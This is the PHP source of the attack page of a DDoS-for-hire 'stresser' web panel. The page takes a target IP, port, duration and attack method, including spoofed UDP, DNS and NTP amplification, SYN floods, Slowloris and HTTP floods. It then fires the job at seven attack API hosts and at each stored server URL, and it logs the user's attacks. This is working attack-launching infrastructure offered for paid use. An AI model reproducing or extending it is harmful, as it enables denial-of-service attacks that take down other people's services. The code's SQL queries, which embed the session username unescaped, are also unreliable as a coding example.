<?php
ob_start();
error_reporting(0);
require_once 'includes/db.php';
require_once 'includes/init.php';
if (!($user -> LoggedIn()))
{
	header('location: login.php');
	die();
}
if (!($user -> notBanned($odb)))
{
	header('location: login.php');
	die();
}
?>
<head>
<script type="text/javascript" src='https://code.jquery.com/jquery.min.js'></script>

<title>StrikeREAD Stresser | ATTACK HUB</title>
<meta http-equiv='content-type' content='text/html; charset=UTF-8' />
<link rel='stylesheet' type='text/css' href='css/system.css' />
<link href='css/font-awesome/css/font-awesome.css' rel='stylesheet' />
<link href='//maxcdn.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css' rel='stylesheet'>
<script type='text/javascript' src='css/tooltip/tooltip_bootstrap.js'></script>
<script type='text/javascript' src='css/tooltip/tooltip.js'></script>
</head>
<body>
	<div id='sidebar'>
	<?php 
	include("sidebar.php"); 
	?>
		 
<div class='content-page'>				
<form method="POST">
<h2>Attack:</h2>
<?php
											if(isset($_POST['attackBtn'])){
												$host = $_POST['host'];
												$port = intval($_POST['port']);
												$time = intval($_POST['time']);
												$method = $_POST['method'];
												if(empty($host) || empty($time) || empty($port) || empty($method)){
													echo $design->alert('error', 'Error', 'Please Fill In All Fields!');
												} elseif($time < 1) {
													echo $design->alert('error', 'Error', 'Attack Time Must Be 1 or Greater!');
												} elseif(!isset($_POST['tos'])){
													echo $design->alert('error', 'Error', 'You Must Agree To The Terms of Service!');
												} else {
													if(!filter_var($host, FILTER_VALIDATE_IP)){
														echo $design->alert('error', 'Error', 'Invalid Host!');
													} else {
														$SQLCheckBlacklist = $odb->prepare("SELECT COUNT(*) FROM `blacklist` WHERE `IP` = :host");
														$SQLCheckBlacklist->execute(array(':host' => $host));
														$countBlacklist = $SQLCheckBlacklist -> fetchColumn(0);
														if($countBlacklist > 0){
															echo $design->alert('error', 'Error', 'This Host Has Been Blacklisted!');
														} else {
															$checkRunningSQL = $odb->prepare("SELECT COUNT(*) FROM `logs` WHERE `user` = :username  AND `time` + `date` > UNIX_TIMESTAMP()");
															$checkRunningSQL->execute(array(':username' => $_SESSION['username']));
															$countRunning = $checkRunningSQL -> fetchColumn(0);
															if($countRunning == 0){
																$SQLGetTime = $odb->prepare("SELECT `plans`.`mbt` FROM `plans` LEFT JOIN `users` ON `users`.`membership` = `plans`.`ID` WHERE `users`.`ID` = :id");
																$SQLGetTime->execute(array(':id' => $_SESSION['ID']));
																$maxTime = $SQLGetTime -> fetchColumn(0);
																if(!($time > $maxTime)){
																	@file_get_contents("http://api1.com/send.php?key=strikeread&host={$host}&time={$time}&port={$port}&method={$method} ");
																	@file_get_contents("http://api2.com/send.php?key=strikeread&host={$host}&time={$time}&port={$port}&method={$method} ");
																	@file_get_contents("http://api3.com/send.php?key=strikeread&host={$host}&time={$time}&port={$port}&method={$method} ");
																	@file_get_contents("http://api4.com/send.php?key=strikeread&host={$host}&time={$time}&port={$port}&method={$method} ");
																	@file_get_contents("http://api5.com/send.php?key=strikeread&host={$host}&time={$time}&port={$port}&method={$method} ");
																	@file_get_contents("http://api6.com/send.php?key=strikeread&host={$host}&time={$time}&port={$port}&method={$method} ");
																	@file_get_contents("http://api7.com/send.php?key=strikeread&host={$host}&time={$time}&port={$port}&method={$method} ");
																	$insertLogSQL = $odb ->prepare("INSERT INTO `logs` VALUES(:user, :ip, :port, :time, :method, UNIX_TIMESTAMP())");
																	$insertLogSQL->execute(array(':user' => $_SESSION['username'], ':ip' => $host, ':port' => $port, ':time' => $time, ':method' => $method));
																	echo $design->alert('message', 'Success', 'Attack has been started on '.$host.':'.$port.' for '.$time.' seconds using '.$method.'!');
																	$sql = $odb->prepare("SELECT * FROM `servers");
																	$sql->execute();
																	while($r = $sql->fetch()){
																		$url = $r["url"]."&ip={$host}&port={$port}&time={$time}";
																		$ch = curl_init();
																		curl_setopt($ch, CURLOPT_URL, $url);
																		curl_setopt($ch, CURLOPT_HEADER, 0);
																		curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
																		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
																		curl_setopt($ch, CURLOPT_TIMEOUT, 1);
																		curl_exec($ch);
																		curl_close($ch);
																	}
																} else {
																	echo $design->alert('error', 'Error', 'Your Maximum Attack time is '.$maxTime.'!');
																}
															} else {
																echo $design->alert('error', 'Error', 'You Currently Have An Attack Running!');
															}
														}
													}
												}
											}
										?>

<input type="text" id="host" name="host" class='login-input' placeholder="IP Address" /><br>
<input type="text" id="port" name="port" placeholder="Port" class='login-input'/><br>
<input type="text" id="time" name="time"  placeholder="Time" class='login-input'/><br>
<h3>Layer 4:</h3>
<input type="checkbox" name="method" id="method" value="udp" /><label for="method1">Spoofed UDP</label>
<input type="checkbox" name="method" id="method" value="dns" /><label for="method1">DNS Amplification</label>
<input type="checkbox" name="method" id="method" value="ssdp" /><label for="method1">SSDP</label>
<input type="checkbox" name="method" id="method" value="ntp" /><label for="method1">NTP Amplifcation</label>
<input type="checkbox" name="method" id="method" value="ssyn" /><label for="method1">Spoofed SYN</label>
<h3>Layer 7:</h3>
<input type="checkbox" name="method" id="method" value="httpget" /><label for="method1">HTTP-GET</label>
<input type="checkbox" name="method" id="method" value="httppost" /><label for="method1">HTTP-POST</label>
<input type="checkbox" name="method" id="method" value="httphead" /><label for="method1">HTTP-HEAD</label>
<input type="checkbox" name="method" id="method" value="rudy" /><label for="method1">R-U-DEAD-YET? (rudy)</label>
<input type="checkbox" name="method" id="method" value="arme" /><label for="method1">A.R.M.E</label>
<input type="checkbox" name="method" id="method" value="slow" /><label for="method1">Slowloris</label>
<input type="checkbox" name="method" id="method" value="source" /><label for="method1">Source HEAD</label>
<input type="checkbox" name="method" id="method" value="joomla" /><label for="method1">Joomla Reflection</label>
<br><br>
<input name="tos" type="checkbox" value="Terms of Service"/> I Agree To The <a href="tosl.php">Terms of Service</a><br>
<input type='submit' value='Send DDOS' id='launch' class='login-input' style='width:auto;cursor:pointer'; name='attackBtn'><br>
</form>

<h2>Stop Attack:</h2>
<table id='eix'>
<thead>
<tr>
<td>IP</td>
<td>Port <A title="Default : 80" rel='tooltip' herf='#' class='icon-info-sign'></a></h2> </td>
<td>Method</td>
<td>Time</td>
<td>Stop</td>
</tr>
</thead>
<tbody>
<tr>
	<?php
				$SQLGetLogs = $odb -> query("SELECT * FROM `logs` WHERE user='{$_SESSION['username']}' ORDER BY `date` DESC LIMIT 0, 1");
				while($getInfo = $SQLGetLogs -> fetch(PDO::FETCH_ASSOC))
				{
					$IP = $getInfo['ip'];
					$port = $getInfo['port'];
					$time = $getInfo['time'];
					$method = $getInfo['method'];
					$date = date("d-m-Y, h:i:s a" ,$getInfo['date']);
				}
					
				?>
	<td style='text-align:center;'><?php echo $IP; ?></td>
	<td style='text-align:center;'><?php echo $port; ?></td>
	<td style='text-align:center;'><?php echo $method; ?></td>
	<td style='text-align:center;'><?php echo $time; ?></td>
	<td style='text-align:center;'><i class="fa fa-power-off"></i> Stop</td>
</tbody>
</table>

<h2>Attack Logs:</h2>
<table id='eix'>
<thead>
<tr>
<td>IP</td>
<td>Port <A title="Default : 80" rel='tooltip' herf='#' class='icon-info-sign'></a></h2> </td>
<td>Method</td>
<td>Time</td>
<td>Date</td>
<td>Renew</td>
</tr>
</thead>
<tbody>
<tr>
	<?php
				$SQLGetLogs = $odb -> query("SELECT * FROM `logs` WHERE user='{$_SESSION['username']}' ORDER BY `date` DESC LIMIT 0, 999999");
				while($getInfo = $SQLGetLogs -> fetch(PDO::FETCH_ASSOC))
				{
					$IP = $getInfo['ip'];
					$port = $getInfo['port'];
					$time = $getInfo['time'];
					$method = $getInfo['method'];
					$date = date("d-m-Y, h:i:s a" ,$getInfo['date']);
				}
					
				?>
	<td style='text-align:center;'><?php echo $IP; ?></td>
	<td style='text-align:center;'><?php echo $port; ?></td>
	<td style='text-align:center;'><?php echo $method; ?></td>
	<td style='text-align:center;'><?php echo $time; ?></td>
	<td style='text-align:center;'><?php echo $date; ?></td>
	<td style='text-align:center;'><i class="fa fa-refresh"></i> Renew</td>
<tr>
</tbody>
</table>
</div>
</tbody>

<script>
    $(".content-page").fadeIn(350);
</script>